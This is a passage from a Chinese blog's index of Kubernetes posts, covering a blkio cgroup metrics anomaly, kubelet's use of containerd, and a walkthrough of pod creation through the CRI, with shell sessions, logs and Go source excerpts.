[腾讯 Tlinux 的一个优化](https://github.com/Tencent/TencentOS-kernel/commit/e7636c1b8b5e4214b68d048ae3d3442045ea757c#diff-aa274e206b462ae50089a5a3e16d6926e2001404a1876032316f7c37e08cd111) 可以在 github 上看到,做 pre blkcg 的隔离","tags":["k8s"]},{"title":"blkio cgroup 异常","path":"/2021/05/10/blk-io-1/","content":"blkio cgroup 异常线上集群 pod 的磁盘监控数据丢失，经过其他同学的诊断发现是 cgroup 异常 blkio 源码分析 k8s 对 cgroup 的支持https://www.youtube.com/watch?v=u8h0e84HxcE historyblk-group-support.png 123456789101112131415161718192021root@xxx:/home/xxxx# for i in $(ls -d /sys/fs/cgroup/blkio/kubepods/pod*/); do echo $i &amp;&amp; cat $i/blkio.io_merged; done/sys/fs/cgroup/blkio/kubepods/pod10543084-fcc4-11ea-8ffd-525400cdb22d/Total 0/sys/fs/cgroup/blkio/kubepods/pod24b4819f-dbb5-11ea-8ffd-525400cdb22d/Total 0/sys/fs/cgroup/blkio/kubepods/pod7376584e-e05f-11ea-8ffd-525400cdb22d/Total 0/sys/fs/cgroup/blkio/kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0/sys/fs/cgroup/blkio/kubepods/poddd0ee417-e36e-11ea-8ffd-525400cdb22d/8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0 初步结论 没有按照我对 cgroup 层次概念进行继承，当然也有可能是我理解不对。 测试 11234567891011121314root@xxxb:/sys/fs/cgroup/blkio/kubepods# mkdir testroot@xxxb:/sys/fs/cgroup/blkio/kubepods# cat test/blkio.io_mergedTotal 0root@xxxb:/sys/fs/cgroup/blkio/kubepods# cat /proc/23365/cmdlinetoproot@xxxb:/sys/fs/cgroup/blkio/kubepods# echo &quot;23365&quot; &gt; test/tasksroot@xxxb:/sys/fs/cgroup/blkio/kubepods# cat test/tasks23365root@xxxb:/sys/fs/cgroup/blkio/kubepods# cat test/blkio.io_merged # 不能有效记录 buffer io, 只能记录 direct ioTotal 0 的确是没有，发现blkio.io_merged文件有内容。发现 dnode1-1091 发现全部都是 merged total 0 123456root@xxx:/sys/fs/cgroup/blkio/kubepods# cat /sys/fs/cgroup/blkio/kubepods/pod*/blkio.io_mergedTotal 0Total 0Total 0Total 0Total 0 同一个 pod 的不同 container 也有差异12345678910root@xxxa:/sys/fs/cgroup/blkio# cat /sys/fs/cgroup/blkio/kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/e3ddfe3d43d4ad15c84a658b177f933db7a0f84286b27c65f39a7a23aadf193a/blkio.io_mergedTotal 0root@xxxa:/sys/fs/cgroup/blkio# cat /sys/fs/cgroup/blkio/kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/b640917f50fd1235a43e49e5075ef20ca2b79f733e5cd36dd38ead228fb06e54/blkio.io_merged8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0 使用如下两个命令输出没有实质性差异 1root@xxx:/sys/fs/cgroup/blkio# docker inspect b640917f50fd1235a43e49e5075ef20ca2b79f733e5cd36dd38ead228fb06e54 1root@xxx:/sys/fs/cgroup/blkio# docker inspect e3ddfe3d43d4ad15c84a658b177f933db7a0f84286b27c65f39a7a23aadf193a 不同版本内核对比123456789101112131415161718192021222324252627282930root@xxx:/sys/fs/cgroup/blkio# mkdir test1root@xxx:/sys/fs/cgroup/blkio# cat test1/blkio.io_merged_recursiveTotal 0root@xxx:/sys/fs/cgroup/blkio# cgexec -g blkio:test1 time dd if=/dev/zero of=/home/test1 bs=1k count=100 oflag=direct100+0 records in100+0 records out102400 bytes (102 kB) copied, 0.00640967 s, 16.0 MB/s0.00user 0.11system 0:00.11elapsed 95%CPU (0avgtext+0avgdata 2184maxresident)k0inputs+350outputs (0major+89minor)pagefaults 0swapsroot@xxx:/sys/fs/cgroup/blkio# cat test1/blkio.io_merged_recursive8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0root@xxx:/sys/fs/cgroup/blkio# cat test1/blkio.io_merged8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0root@xxx:/sys/fs/cgroup/blkio# uname -sirLinux 4.9.0-0.bpo.6-amd64 unknown 使用已经存在的 cgroup 去限制 io ,发现 cgroup 里面的数据已经被初始化了。 12345678910111213141516171819# cgexec -g blkio:kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/e3ddfe3d43d4ad15c84a658b177f933db7a0f84286b27c65f39a7a23aadf193a time dd if=/dev/zero of=/home/test1 bs=1k count=100 oflag=direct100+0 records in100+0 records out102400 bytes (102 kB) copied, 0.119833 s, 855 kB/s0.00user 0.00system 0:00.12elapsed 3%CPU (0avgtext+0avgdata 2324maxresident)k0inputs+350outputs (0major+90minor)pagefaults 0swaps# cat /sys/fs/cgroup/blkio/kubepods/pod73cb6fd7-fe57-11ea-8ffd-525400cdb22d/e3ddfe3d43d4ad15c84a658b177f933db7a0f84286b27c65f39a7a23aadf193a/blkio.io_merged8:0 Read 08:0 Write 08:0 Sync 08:0 Async 08:0 Total 0Total 0# docker exec -it 39d9ab5e31a2 dd if=/dev/zero of=/home/test1 bs=1k count=100 oflag=direct100+0 records in100+0 records out102400 bytes (102 kB, 100 KiB) copied, 0.076378 s, 1.3 MB/s 结论在 4.9.0 版本上 blkio.io_merged 是懒惰初始化，在没有发生 direct io 的之前不会有初始化出这个文件。","tags":["k8s"]},{"title":"kubelet 是如何使用 containerd","path":"/2021/01/06/kubelet-use-cotnainerd/","content":"梳理这个目的是为了以后 containerd 上线提前储备相关知识，预设问题还是之前的 POD 是如何创建，以此来摸索他的调用链路。 kubelet-create-pod 参数对比对比一下 kubelet 使用 dockerd 和 cotnainerd 参数的对比，最核心的地方就是 --container-runtime=remote --container-runtime-endpoint=/run/containerd/containerd.sock 指定 CRI 的地址调用地址，而 docker 默认是使用的 /var/run/docker.sock docker 的命令行参数 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --allowed-unsafe-sysctls=net.core.somaxconn --cloud-provider=aws --eviction-hard=memory.available&lt;1Mi,nodefs.available&lt;1Mi,nodefs.inodesFree&lt;1 --max-pods=110 --network-plugin=cni containerd 的命令行参数 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --container-runtime=remote --container-runtime-endpoint=/run/containerd/containerd.sock --fail-swap-on=false --node-ip= --fail-swap-on=false containerd 的 CRI 实现分析一下 containerd 的启动信息，会对关键信息做出标示。 12345678910111213141516Jan 06 06:58:39 kind-control-plane systemd[1]: Started containerd container runtime.Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.310871000Z&quot; level=info msg=&quot;starting containerd&quot; revision=449e926990f8539fd00844b26c07e2f1e306c760 version=v1.3.3-14-g449e9269 // 版本信息... 删除和当前话题不相关的日志Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.628292200Z&quot; level=info msg=&quot;loading plugin \\&quot;io.containerd.grpc.v1.cri\\&quot;...&quot; type=io.containerd.grpc.v1Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.628593500Z&quot; level=info msg=&quot;Start cri plugin with config &#123;PluginConfig:&#123;ContainerdConfig:&#123;Snapshotter:overlayfs DefaultRuntimeName:runc DefaultRuntime:&#123;Type: Engine: PodAnnotations:[] Root: Options:&lt;nil&gt; PrivilegedWithoutHostDevices:false&#125; UntrustedWorkloadRuntime:&#123;Type: Engine: PodAnnotations:[] Root: Options:&lt;nil&gt; PrivilegedWithoutHostDevices:false&#125; Runtimes:map[runc:&#123;Type:io.containerd.runc.v2 Engine: PodAnnotations:[] Root: Options:&lt;nil&gt; PrivilegedWithoutHostDevices:false&#125; test-handler:&#123;Type:io.containerd.runc.v2 Engine: PodAnnotations:[] Root: Options:&lt;nil&gt; PrivilegedWithoutHostDevices:false&#125;] NoPivot:false&#125; CniConfig:&#123;NetworkPluginBinDir:/opt/cni/bin NetworkPluginConfDir:/etc/cni/net.d NetworkPluginMaxConfNum:1 NetworkPluginConfTemplate:&#125; Registry:&#123;Mirrors:map[docker.io:&#123;Endpoints:[https://registry-1.docker.io]&#125;] Configs:map[] Auths:map[]&#125; DisableTCPService:true StreamServerAddress:127.0.0.1 StreamServerPort:0 StreamIdleTimeout:4h0m0s EnableSelinux:false SandboxImage:k8s.gcr.io/pause:3.2 StatsCollectPeriod:10 SystemdCgroup:false EnableTLSStreaming:false X509KeyPairStreaming:&#123;TLSCertFile: TLSKeyFile:&#125; MaxContainerLogLineSize:16384 DisableCgroup:false DisableApparmor:false RestrictOOMScoreAdj:false MaxConcurrentDownloads:3 DisableProcMount:false&#125; ContainerdRootDir:/var/lib/containerd ContainerdEndpoint:/run/containerd/containerd.sock RootDir:/var/lib/containerd/io.containerd.grpc.v1.cri StateDir:/run/containerd/io.containerd.grpc.v1.cri&#125;&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.628725100Z&quot; level=info msg=&quot;Connect containerd service&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.629022800Z&quot; level=info msg=&quot;Get image filesystem path \\&quot;/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs\\&quot;&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.654848300Z&quot; level=info msg=&quot;loading plugin \\&quot;io.containerd.grpc.v1.introspection\\&quot;...&quot; type=io.containerd.grpc.v1Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.656292800Z&quot; level=info msg=serving... address=/run/containerd/containerd.sock.ttrpc Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.656821700Z&quot; level=info msg=serving... address=/run/containerd/containerd.sock // 这里就是启动的关键点，对外提供一个 sock Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.657936200Z&quot; level=info msg=&quot;containerd successfully booted in 0.349859s&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.656645700Z&quot; level=info msg=&quot;Start subscribing containerd event&quot;Jan 06 06:58:40 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:40.659444000Z&quot; level=info msg=&quot;Start recovering state&quot;Jan 06 06:58:41 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:41.336754900Z&quot; level=info msg=&quot;Start event monitor&quot;Jan 06 06:58:41 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:41.337037100Z&quot; level=info msg=&quot;Start snapshots syncer&quot;Jan 06 06:58:41 kind-control-plane containerd[6056]: time=&quot;2021-01-06T06:58:41.337099000Z&quot; level=info msg=&quot;Start streaming server&quot; io.containerd.grpc.v1.cri 的实现我们测试环境的版本是 1.3.3，checkout 出相关代码可以看到如下代码。在新的版本中 cotnaienrd cri 代码仓库已经合并到了的 containerd 代码仓库了。 1import _ &quot;github.com/containerd/cri&quot; 从代码分析可以看出端倪，当前版本包装了 containerd 实现了的是 v1alpha2 的 CRI 定义。 123456func (c *criService) register(s *grpc.Server) error &#123;\tinstrumented := newInstrumentedService(c)\truntime.RegisterRuntimeServiceServer(s, instrumented) // 这个 runtime 是 import runtime &quot;k8s.io/cri-api/pkg/apis/runtime/v1alpha2&quot;\truntime.RegisterImageServiceServer(s, instrumented)\treturn nil&#125; 看一下核心函数 CRI 的核心接口 RunPodSandbox，之所以先看这个函数主要原因是因为这个函数给 POD 准备了网络等等也符合 POD 的创建的时间序列 123456789101112131415func (in *instrumentedService) RunPodSandbox(ctx context.Context, r *runtime.RunPodSandboxRequest) (res *runtime.RunPodSandboxResponse, err error) &#123;\tif err := in.checkInitialized(); err != nil &#123; return nil, err\t&#125;\tlog.G(ctx).Infof(&quot;RunPodsandbox for %+v&quot;, r.GetConfig().GetMetadata())\tdefer func() &#123; if err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;RunPodSandbox for %+v failed, error&quot;, r.GetConfig().GetMetadata()) &#125; else &#123; log.G(ctx).Infof(&quot;RunPodSandbox for %+v returns sandbox id %q&quot;, r.GetConfig().GetMetadata(), res.GetPodSandboxId()) &#125;\t&#125;()\tres, err = in.c.RunPodSandbox(ctrdutil.WithNamespace(ctx), r)\treturn res, errdefs.ToGRPC(err)&#125; container 已 plugin 实现的 RunPodSandbox和 dockershim 的版本实现没有本质区别。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271// RunPodSandbox creates and starts a pod-level sandbox. Runtimes should ensure// the sandbox is in ready state.func (c *criService) RunPodSandbox(ctx context.Context, r *runtime.RunPodSandboxRequest) (_ *runtime.RunPodSandboxResponse, retErr error) &#123;\tconfig := r.GetConfig()\tlog.G(ctx).Debugf(&quot;Sandbox config %+v&quot;, config)\t// Generate unique id and name for the sandbox and reserve the name.\tid := util.GenerateID()\tmetadata := config.GetMetadata() // 都是 kubelet 传入的\tif metadata == nil &#123; return nil, errors.New(&quot;sandbox config must include metadata&quot;)\t&#125;\tname := makeSandboxName(metadata)\tlog.G(ctx).Debugf(&quot;Generated id %q for sandbox %q&quot;, id, name)\t// Reserve the sandbox name to avoid concurrent `RunPodSandbox` request starting the\t// same sandbox.\tif err := c.sandboxNameIndex.Reserve(name, id); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to reserve sandbox name %q&quot;, name)\t&#125;\tdefer func() &#123; // Release the name if the function returns with an error. if retErr != nil &#123; c.sandboxNameIndex.ReleaseByName(name) &#125;\t&#125;()\t// Create initial internal sandbox object.\tsandbox := sandboxstore.NewSandbox( sandboxstore.Metadata&#123; ID: id, Name: name, Config: config, RuntimeHandler: r.GetRuntimeHandler(), &#125;, sandboxstore.Status&#123; State: sandboxstore.StateUnknown, &#125;,\t)\t// Ensure sandbox container image snapshot.\timage, err := c.ensureImageExists(ctx, c.config.SandboxImage, config)\tif err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to get sandbox image %q&quot;, c.config.SandboxImage)\t&#125;\tcontainerdImage, err := c.toContainerdImage(ctx, *image)\tif err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to get image from containerd %q&quot;, image.ID)\t&#125;\tociRuntime, err := c.getSandboxRuntime(config, r.GetRuntimeHandler())\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to get sandbox runtime&quot;)\t&#125;\tlog.G(ctx).Debugf(&quot;Use OCI %+v for sandbox %q&quot;, ociRuntime, id)\tsecurityContext := config.GetLinux().GetSecurityContext()\t//Create Network Namespace if it is not in host network\thostNet := securityContext.GetNamespaceOptions().GetNetwork() == runtime.NamespaceMode_NODE\tif !hostNet &#123; // If it is not in host network namespace then create a namespace and set the sandbox // handle. NetNSPath in sandbox metadata and NetNS is non empty only for non host network // namespaces. If the pod is in host network namespace then both are empty and should not // be used. sandbox.NetNS, err = netns.NewNetNS() if err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to create network namespace for sandbox %q&quot;, id) &#125; sandbox.NetNSPath = sandbox.NetNS.GetPath() defer func() &#123; if retErr != nil &#123; if err := sandbox.NetNS.Remove(); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to remove network namespace %s for sandbox %q&quot;, sandbox.NetNSPath, id) &#125; sandbox.NetNSPath = &quot;&quot; &#125; &#125;() // Setup network for sandbox. // Certain VM based solutions like clear containers (Issue containerd/cri-containerd#524) // rely on the assumption that CRI shim will not be querying the network namespace to check the // network states such as IP. // In future runtime implementation should avoid relying on CRI shim implementation details. // In this case however caching the IP will add a subtle performance enhancement by avoiding // calls to network namespace of the pod to query the IP of the veth interface on every // SandboxStatus request. if err := c.setupPodNetwork(ctx, &amp;sandbox); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to setup network for sandbox %q&quot;, id) &#125; defer func() &#123; if retErr != nil &#123; // Teardown network if an error is returned. if err := c.teardownPodNetwork(ctx, sandbox); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to destroy network for sandbox %q&quot;, id) &#125; &#125; &#125;()\t&#125;\t// Create sandbox container.\tspec, err := c.generateSandboxContainerSpec(id, config, &amp;image.ImageSpec.Config, sandbox.NetNSPath, ociRuntime.PodAnnotations)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to generate sandbox container spec&quot;)\t&#125;\tlog.G(ctx).Debugf(&quot;Sandbox container %q spec: %#+v&quot;, id, spew.NewFormatter(spec))\tvar specOpts []oci.SpecOpts\tuserstr, err := generateUserString( &quot;&quot;, securityContext.GetRunAsUser(), securityContext.GetRunAsGroup(),\t)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to generate user string&quot;)\t&#125;\tif userstr == &quot;&quot; &#123; // Lastly, since no user override was passed via CRI try to set via OCI // Image userstr = image.ImageSpec.Config.User\t&#125;\tif userstr != &quot;&quot; &#123; specOpts = append(specOpts, oci.WithUser(userstr))\t&#125;\tseccompSpecOpts, err := generateSeccompSpecOpts( securityContext.GetSeccompProfilePath(), securityContext.GetPrivileged(), c.seccompEnabled)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to generate seccomp spec opts&quot;)\t&#125;\tif seccompSpecOpts != nil &#123; specOpts = append(specOpts, seccompSpecOpts)\t&#125;\tsandboxLabels := buildLabels(config.Labels, containerKindSandbox)\truntimeOpts, err := generateRuntimeOptions(ociRuntime, c.config)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to generate runtime options&quot;)\t&#125;\topts := []containerd.NewContainerOpts&#123; containerd.WithSnapshotter(c.config.ContainerdConfig.Snapshotter), customopts.WithNewSnapshot(id, containerdImage), containerd.WithSpec(spec, specOpts...), containerd.WithContainerLabels(sandboxLabels), containerd.WithContainerExtension(sandboxMetadataExtension, &amp;sandbox.Metadata), containerd.WithRuntime(ociRuntime.Type, runtimeOpts)&#125;\tcontainer, err := c.client.NewContainer(ctx, id, opts...) // 上一篇的调用 containerd 写 metadata if err != nil &#123; return nil, errors.Wrap(err, &quot;failed to create containerd container&quot;)\t&#125;\tdefer func() &#123; if retErr != nil &#123; deferCtx, deferCancel := ctrdutil.DeferContext() defer deferCancel() if err := container.Delete(deferCtx, containerd.WithSnapshotCleanup); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to delete containerd container %q&quot;, id) &#125; &#125;\t&#125;()\t// Create sandbox container root directories.\tsandboxRootDir := c.getSandboxRootDir(id)\tif err := c.os.MkdirAll(sandboxRootDir, 0755); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to create sandbox root directory %q&quot;, sandboxRootDir)\t&#125;\tdefer func() &#123; if retErr != nil &#123; // Cleanup the sandbox root directory. if err := c.os.RemoveAll(sandboxRootDir); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to remove sandbox root directory %q&quot;, sandboxRootDir) &#125; &#125;\t&#125;()\tvolatileSandboxRootDir := c.getVolatileSandboxRootDir(id)\tif err := c.os.MkdirAll(volatileSandboxRootDir, 0755); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to create volatile sandbox root directory %q&quot;, volatileSandboxRootDir)\t&#125;\tdefer func() &#123; if retErr != nil &#123; // Cleanup the volatile sandbox root directory. if err := c.os.RemoveAll(volatileSandboxRootDir); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to remove volatile sandbox root directory %q&quot;, volatileSandboxRootDir) &#125; &#125;\t&#125;()\t// Setup sandbox /dev/shm, /etc/hosts, /etc/resolv.conf and /etc/hostname.\tif err = c.setupSandboxFiles(id, config); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to setup sandbox files&quot;)\t&#125;\tdefer func() &#123; if retErr != nil &#123; if err = c.unmountSandboxFiles(id, config); err != nil &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to unmount sandbox files in %q&quot;, sandboxRootDir) &#125; &#125;\t&#125;()\t// Update sandbox created timestamp.\tinfo, err := container.Info(ctx)\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to get sandbox container info&quot;)\t&#125;\t// Create sandbox task in containerd.\tlog.G(ctx).Tracef(&quot;Create sandbox container (id=%q, name=%q).&quot;, id, name)\tvar taskOpts []containerd.NewTaskOpts\t// TODO(random-liu): Remove this after shim v1 is deprecated.\tif c.config.NoPivot &amp;&amp; (ociRuntime.Type == plugin.RuntimeRuncV1 || ociRuntime.Type == plugin.RuntimeRuncV2) &#123; taskOpts = append(taskOpts, containerd.WithNoPivotRoot)\t&#125;\t// We don&#x27;t need stdio for sandbox container.\ttask, err := container.NewTask(ctx, containerdio.NullIO, taskOpts...) // 我们熟悉的调用 cotnainer 的 task 启动创建 contianer\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to create containerd task&quot;)\t&#125;\tdefer func() &#123; if retErr != nil &#123; deferCtx, deferCancel := ctrdutil.DeferContext() defer deferCancel() // Cleanup the sandbox container if an error is returned. if _, err := task.Delete(deferCtx, containerd.WithProcessKill); err != nil &amp;&amp; !errdefs.IsNotFound(err) &#123; log.G(ctx).WithError(err).Errorf(&quot;Failed to delete sandbox container %q&quot;, id) &#125; &#125;\t&#125;()\t// wait is a long running background request, no timeout needed.\texitCh, err := task.Wait(ctrdutil.NamespacedContext()) // 等待 task 完成\tif err != nil &#123; return nil, errors.Wrap(err, &quot;failed to wait for sandbox container task&quot;)\t&#125;\tif err := task.Start(ctx); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to start sandbox container task %q&quot;, id)\t&#125;\tif err := sandbox.Status.Update(func(status sandboxstore.Status) (sandboxstore.Status, error) &#123; // Set the pod sandbox as ready after successfully start sandbox container. status.Pid = task.Pid() status.State = sandboxstore.StateReady status.CreatedAt = info.CreatedAt return status, nil\t&#125;); err != nil &#123; return nil, errors.Wrap(err, &quot;failed to update sandbox status&quot;)\t&#125;\t// Add sandbox into sandbox store in INIT state.\tsandbox.Container = container\tif err := c.sandboxStore.Add(sandbox); err != nil &#123; return nil, errors.Wrapf(err, &quot;failed to add sandbox %+v into store&quot;, sandbox)\t&#125;\t// start the monitor after adding sandbox into the store, this ensures\t// that sandbox is in the store, when event monitor receives the TaskExit event.\t//\t// TaskOOM from containerd may come before sandbox is added to store,\t// but we don&#x27;t care about sandbox TaskOOM right now, so it is fine.\tc.eventMonitor.startExitMonitor(context.Background(), id, task.Pid(), exitCh)\treturn &amp;runtime.RunPodSandboxResponse&#123;PodSandboxId: id&#125;, nil&#125; 有了 dockershim 上次的基础，这次再看 containerd 中不同插件之间调用就要简单的多，过多细节不在赘述。","tags":["k8s"]},{"title":"kubelet 是如何启动 POD","path":"/2020/12/15/kubelet-create-pod/","content":"出于 containerd 上线需求，走读线上组件的代码确定现有 POD 创建流程，主要关注的是组件之间是如何交互沟通的进行 POD 创建的。 kubelet-create-pod kubelet kubelet 如何创建 POD dockershim dockerd 接口 &#x2F;containers&#x2F;{name:.*}&#x2F;start containerd ContainersServer.Create 方法的实现 TasksServer.Create 方法的实现 TasksServer.Start 方法的实现 containerd-shim 的如何工作 contained-shim create contained-shim start runc run create –bundle runc init runc start kubelet线上主要有两个版本的 k8s，这次代码走读主要关注 1.17.4 版本。观察 kubelet 初始化流程可以看到与运行时相关参数如下--container-runtime= 参数为 docker。查看启动日志，可以看到 kubelet 启动了一个 dockershim 的服务，这个服务就是目前调研的一个关键点，因为社区在 1.20 版本中准备弃用 dockershim 了。 1234I1215 16:38:23.359299 2052022 docker_service.go:274] Setting cgroupDriver to cgroupfsI1215 16:38:23.359435 2052022 kubelet.go:642] Starting the GRPC server for the docker CRI shim.I1215 16:38:23.359456 2052022 docker_server.go:59] Start dockershim grpc server... 调研社区文档发现，dockershim 之所以被提出是为了解决 kubernetes 开发者面临多个runtime都要接入kubernetes导致调用运行时的相关代码接口不稳定的问题。开发者引入一个抽象层对上屏蔽底层的runtime实现差异，这个抽象层称为CRI, 这里的 dockershim 就是基于 docker 二次封装的一个 CRI 实现。shim 这个单词的由来可以从 wiki 上查到 an application compatibility workaround。 kubelet 如何创建 POD在 POD 创建过程中首先需要准备一个被成为 sandbox 的容器用来初始化设置基础网络等等诸多事宜。走读 CRI 接口发现创建 Sandbox 这个是 CRI 的一个重要功能。 基于 kubelet 的源码分析，通过源码分析了解到 syncLoopIteration -&gt; HandlePodAdditions -&gt; dispatchWork-&gt;UpdatePod-&gt; managePodLoop 这样的一个函数调用关系。 12345678910func (p *podWorkers) managePodLoop(podUpdates &lt;-chan UpdatePodOptions) &#123;\tvar lastSyncTime time.Time... err = p.syncPodFn(syncPodOptions&#123; // 就是这个 syncPodFn 函数的实现 mirrorPod: update.MirrorPod, pod: update.Pod, podStatus: status, killPodOptions: update.KillPodOptions, updateType: update.UpdateType, &#125;) 其中的 syncPodFn 具体实现是 klet.syncPod 函数，可以通过代码klet.podWorkers = newPodWorkers(klet.syncPod, kubeDeps.Recorder, klet.workQueue, klet.resyncInterval, backOffPeriod, klet.podCache)看出。基于以上信息可以推论出 podWorkers 才是 pod 创建的核心。走读woker的 SyncPod 这个函数就是就是 podWorkers 核心流程了，worker 通过 sync 函数来调用各个 CRI 接口将这些原子接口组装成一个个实际的 kubernetes 的 POD。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091// SyncPod syncs the running pod into the desired pod by executing following steps://// 1. Compute sandbox and container changes.// 2. Kill pod sandbox if necessary.// 3. Kill any containers that should not be running.// 4. Create sandbox if necessary.// 5. Create ephemeral containers.// 6. Create init containers.// 7. Create normal containers.func (m *kubeGenericRuntimeManager) SyncPod(pod *v1.Pod, podStatus *kubecontainer.PodStatus, pullSecrets []v1.Secret, backOff *flowcontrol.Backoff) (result kubecontainer.PodSyncResult) &#123;\t// Step 1: Compute sandbox and container changes.\tpodContainerChanges := m.computePodActions(pod, podStatus) // 还是声明式 api 模型，将操作序列化...\t// Step 2: Kill the pod if the sandbox has changed.\tif podContainerChanges.KillPod &#123;... killResult := m.killPodWithSyncResult(pod, kubecontainer.ConvertPodStatusToRunningPod(m.runtimeName, podStatus), nil)... // 删除一下无关紧要的代码，不影响主线逻辑\t&#125; else &#123; // Step 3: kill any running containers in this pod which are not to keep. for containerID, containerInfo := range podContainerChanges.ContainersToKill &#123; klog.V(3).Infof(&quot;Killing unwanted container %q(id=%q) for pod %q&quot;, containerInfo.name, containerID, format.Pod(pod)) killContainerResult := kubecontainer.NewSyncResult(kubecontainer.KillContainer, containerInfo.name) result.AddSyncResult(killContainerResult) if err := m.killContainer(pod, containerID, containerInfo.name, containerInfo.message, nil); err != nil &#123;...// 一些在运行，但是应该被删除的 container 处理逻辑， &#125; &#125;\t&#125;... // Step 4: Create a sandbox for the pod if necessary.\tpodSandboxID := podContainerChanges.SandboxID\tif podContainerChanges.CreateSandbox &#123;... createSandboxResult := kubecontainer.NewSyncResult(kubecontainer.CreatePodSandbox, format.Pod(pod)) result.AddSyncResult(createSandboxResult) podSandboxID, msg, err = m.createPodSandbox(pod, podContainerChanges.Attempt) // 这个函数是我们关注的核心，准备 pod 的沙盒，如何在 sandbox 中调用 CNI 设置网络/存储等... // 删除一下错误处理，事件的逻辑，网络相关，不影响启动一个不使用网络的 container 😄 // Get podSandboxConfig for containers to start.\tconfigPodSandboxResult := kubecontainer.NewSyncResult(kubecontainer.ConfigPodSandbox, podSandboxID)\tresult.AddSyncResult(configPodSandboxResult)\tpodSandboxConfig, err := m.generatePodSandboxConfig(pod, podContainerChanges.Attempt)\tif err != nil &#123; message := fmt.Sprintf(&quot;GeneratePodSandboxConfig for pod %q failed: %v&quot;, format.Pod(pod), err) klog.Error(message) configPodSandboxResult.Fail(kubecontainer.ErrConfigPodSandbox, message) return\t&#125;\t// Helper containing boilerplate common to starting all types of containers.\t// typeName is a label used to describe this type of container in log messages,\t// currently: &quot;container&quot;, &quot;init container&quot; or &quot;ephemeral container&quot;\tstart := func(typeName string, container *v1.Container) error &#123; startContainerResult := kubecontainer.NewSyncResult(kubecontainer.StartContainer, container.Name) result.AddSyncResult(startContainerResult) isInBackOff, msg, err := m.doBackOff(pod, container, podStatus, backOff) if isInBackOff &#123; startContainerResult.Fail(err, msg) klog.V(4).Infof(&quot;Backing Off restarting %v %+v in pod %v&quot;, typeName, container, format.Pod(pod)) return err &#125; klog.V(4).Infof(&quot;Creating %v %+v in pod %v&quot;, typeName, container, format.Pod(pod)) // NOTE (aramase) podIPs are populated for single stack and dual stack clusters. Send only podIPs. if msg, err := m.startContainer(podSandboxID, podSandboxConfig, container, pod, podStatus, pullSecrets, podIP, podIPs); err != nil &#123; // 创建 cotnainer 和 启动 container 是两回事，创建说的是准备好相关底层文件资源，启动就是以进程形式在 OS 可见，具体还要看底层运行时是如何实现的。 // .. 删除了一部分错误处理的逻辑 // Step 5: start ephemeral containers\t// 这部分逻辑非主线\t// Step 6: start the init container.\tif container := podContainerChanges.NextInitContainerToStart; container != nil &#123; // Start the next init container. if err := start(&quot;init container&quot;, container); err != nil &#123; 